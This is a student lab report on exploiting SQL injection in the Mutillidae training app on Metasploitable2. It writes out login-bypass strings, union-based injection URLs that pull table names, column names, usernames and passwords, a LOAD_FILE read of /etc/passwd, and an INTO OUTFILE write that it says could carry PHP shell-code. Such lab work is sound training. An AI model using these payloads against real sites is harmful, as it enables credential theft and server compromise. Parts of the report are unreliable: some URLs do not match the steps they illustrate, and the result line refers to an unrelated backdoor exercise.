```
NAME : THIRUMALAI K
REG NO : 212224240176
DEPT : AIML
```



# Metasploit
Exploiting SQL Injection vulnerability

# AIM:
To exploit SQL Injection vulnerability using Multidae web application in Metasploitable2

## DESIGN STEPS:

### Step 1:

Install kali linux either in partition or virtual box or in live mode


### Step 2:

Investigate on the various categories of tools as follows:

### Step 3:

Open terminal and try execute some kali linux commands

## EXECUTION STEPS AND ITS OUTPUT:
SQL Injection is a sort of infusion assault that makes it conceivable to execute malicious SQL statements. These statements control a database server behind a web application. Assailants can utilize SQL Injection vulnerabilities to sidestep application safety efforts. They can circumvent authentication and authorization of a page or web application and recover the content of the whole SQL database. 
Identify IP address using ifconfig in Metasploitable2

## OUTPUT :

![Screenshot 2025-05-17 184103](https://github.com/user-attachments/assets/b6b2b71f-7ca8-4403-a9e7-cda98660c3be)



Use the above ip address to access the apache webserver of Metasploitable2 from kali linux. In Kali Linux use the ip address in a web browser.

## OUTPUT :


![01](img/01.png)




Select Multidae from the menu listed as shown above. You will get the page as displayed below:
## OUTPUT :

![Alt text](img/02.png)


Click on the menu Login/Register and register for an account

## OUTPUT :

![Alt text](img/04.png)

Click on the link “Please register here”

## OUTPUT :

![Alt text](img/05.png)



Click on “Create Account” to display the following page:

## OUTPUT :

![Alt text](img/06.png)

The login structure we will use in our examples is straightforward. It contains two input fields (username and password), which are both vulnerable. The back-end content creates a query to approve the username and secret key given by the client. Here is an outline of the page rationale:

($query = “SELECT * FROM users WHERE username=’$_POST[username]’ AND password=’$_POST[password]’“;).
 For the username put “ganesh” or “anything” and for the password put (anything’ or ‘1’=’1) or (admin’ or ‘1’=’1) then try to log in, and you’ll be presented with an admin login page.
 ## OUTPUT :

 ![Alt text](img/09.png)


Click “Login”. The logged in page will show as below:

## OUTPUT :

![Alt text](img/10.png)


##Bypassing login field

The username field is vulnerable. Put (ganesh’ #) or (ganesh’--) in the username field and hit “Enter” to log in. We use “#” or “--” to comment everything in the query sentence that comes after the username filed telling the database to disregard the password field: (SELECT * FROM users WHERE username=’admin’ # AND password=’ ‘). By using line commenting, the aggressor eliminates a part of the login condition and gains access. This technique will make the “WHERE” clause true only for one user; in this case, it is “THIRU.”
=================================================================
If you face error in registration follow the following steps in metasploitable 2:

## OUTPUT :

![Alt text](img/03.png)



This issue is caused by a misconfiguration in the config.inc located in the /var/www/mutillidae folder on Metasploitable 2 VM.

Edit config.inc
Edit config.inc file located in /var/www/mutillidae folder on Metasploitable 2 by typing the following commands [one at the time]:
cd /
sudo nano /var/www/mutillidae/config.inc
Type msfadmin when prompted for the root password. 
Once nano opens config.inc file, look for the line $dbname = ‘metasploit’ as shown in Figure  below:

![Screenshot 2025-05-14 123811](https://github.com/user-attachments/assets/68654f73-0cb7-47c4-8383-aaff605959f5)


Replace ‘metasploit’ with ‘owasp10’ and make sure the lines end with semicolon ; as shown in Figure
## OUTPUT :

![Screenshot 2025-05-14 123905](https://github.com/user-attachments/assets/ca527760-3b29-4354-af73-1c472e384a04)





Save and exit the config.inc
Save than exit the config.inc file by typing CTRL+X keys on your keyboard and the Y [Enter] when prompted to save the file
Restart the Apache server
To restart Apache, type the following command in the terminal. Alternatively, you can just reboot Metasploitalbe 2 VM.
sudo /etc/init.d/apache2 reload

## OUTPUT :

![Screenshot 2025-05-17 184925](https://github.com/user-attachments/assets/8d335aab-0aee-41c2-a40c-2d0fd9132b7b)


 Reset Mutillidae database
Refresh the page then clicking on the Reset DB menu option to reset the Mutillidae database [Figure ]. Click OK when prompted.

## OUTPUT :

![Alt text](img/11.png)

Test the new configuration
Alright. Now is time to test if we managed to fix the database issue. Go ahead and register a new account on the Mutillidae webpage.

 The Mutillidae database error no longer appears 

===============================================================

Now after logging out you will see the login page. In the login page give thiru2’ # . You can see the page now enters into the administrator page as before when giving the password. 

## OUTPUT :
![Alt text](img/12.png)

Click the login button and you will see it enter into the administrator page.

## OUTPUT :

![Alt text](img/10.png)

## Union-based SQL injection

UNION-based SQL injection assaults enable the analyzer to extract data from the database effectively. Since the “UNION” operator must be utilized if the two inquiries have precisely the same structure, the attacker must craft a “SELECT” statement like the first inquiry. 
we will be using the “User Info” page from Mutillidae to perform a Union-Based SQL injection attack. Go to “OWASP Top 10/A1 — Injection/SQLi — Extract-Data/User Info” 

After logging out, Now choose the menu as shown below:

## OUTPUT :

![Alt text](img/14.png)

## OUTPUT :

TO VIEW ACCOUNT DETAILS

![Alt text](img/15.png)

WITHOUT PASSWORD TO SEE ACCOUNT DETAILS

![Alt text](img/16.png)




From this point, all our attack vectors will be performed in the URL section of the page using the Union-Based technique.There are two different ways to discover how many columns are selected by the original query. The first is to infuse an “ORDER BY” statement indicating a column number. Given the column number specified is higher than the number of columns in the “SELECT” statement, an error will be returned.







Since we do not know the number of columns, we start at 1. To find the exact amount of columns, the number is incremented until an error related to the “ORDER BY” clause is returned. In this example, we incremented it to 6 and received an error message, so it means that the number of columns is lower than 6.

The browser url of this info page need to be modified with the url as below:

http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27order%20by%205%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT :


After adding the order by 6 into the existing url , the following error statement will be obtained:

![Alt text](img/17.png)

When we ordered by 5, it worked and displayed some information. It means there are five columns that we can work with. Following screenshot shows that the url modified to have statement added with ordered by 5 replacing 6.

http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27order%20by%205%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT :

![Alt text](img/18.png)

 As it is having 5 columns the query worked fine and it provides the correct result


Instead of using the "order by" option, let’s use the "union select" option and provide all five columns. Ex: (union select 1,2,3,4,5).

As given in the screenshot below columns 2,3,4 are usable in which we can substitute any sql commands to extract necessary information.

## OUTPUT :
![Alt text](img/19.png)


http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27union%20select%201,2,3,4,5%23&password=&user-info-php-submit-button=View+Account+Details

Now we will substitute some few commands like database(), user(), version() to obtain the information regarding the database name, username and version of the database.


http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27union%20select%201,database(),user(),version(),5%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT :
![Alt text](img/20.png)

The url when executed, we obtain the necessary information about the database name owasp10, username as root@localhost and version as 5.0.51a-3ubuntu5.
In MySQL, the table “information_schema.tables” contains all the metadata identified with table items. Below is listed the most useful information on this table.

Replace the query in the url with the following one:
union select 1,table_name,null,null,5 from information_schema.tables where table_schema = ‘owasp10’


The url once executed will  retrieve table names from the “owasp 10” database.
##Extracting sensitive data such as passwords 

When the attacker knows table names, he needs to discover what the column names are to extract data.

In MySQL, the table “information_schema.columns” gives data about columns in tables. One of the most useful columns to extract is called “column_name.”

Ex: (union select 1,colunm_name,null,null,5 from information_schema.columns where table_name = ‘accounts’).

Here we are trying to extract column names from the “accounts” table.

http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27%20union%20select%201,table_name,3,4,5%20from%20information_schema.tables%20where%20table_schema=database()%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT :


![Alt text](img/21.png)





The column names of the accounts is displayed below for the following url:




Once we discovered all available column names, we can extract information from them by just adding those column names in our query sentence.

Ex: (union select 1,username,password,is_admin,5 from accounts).

http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27union%20select%201,column_name,null,null,5%20from%20information_schema.columns%20where%20table_name=%27accounts%27%23&password=&user-info-php-submit-button=View+Account+Details

## OUTPUT :

![Alt text](img/22.png)

## OUTPUT :

http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27union%20select%201,username,password,is_admin,5%20from%20accounts%23&password=&user-info-php-submit-button=View+Account+Details


![Alt text](img/23.png)

## Reading and writing files on the web-server
We can use the “LOAD_FILE()” operator to peruse the contents of any file contained within the web-server. We will typically check for the “/etc/password” file to see if we get lucky and scoop usernames and passwords to possible use in brute force attacks later.

Ex: (union select null,load_file(‘/etc/passwd’),null,null,null).

http://192.168.203.1/mutillidae/index.php?page=user-info.php&username=thiru2%27union%20select%20null,load_file(%27/etc/passwd%27),null,null,null%23&password=&user-info-php-submit-button=View+Account+Details
## OUTPUT :

![Alt text](img/25.png)




the “INTO_OUTFILE()” operator for all that they offer and attempt to root the objective server by transferring a shell-code through SQL infusion. we will write a “Hello World!” sentence and output it in the “/tmp/” directory as a “hello.txt” file. This “Hello World!” sentence can be substituted with any PHP shell-code that you want to execute in the target server.
Ex: (union select null,’Hello World!’,null,null,null into outfile ‘/tmp/hello.txt’).





## RESULT:
The Social Engineering Toolkit (SET) is used to create backdoor is  examined successfully
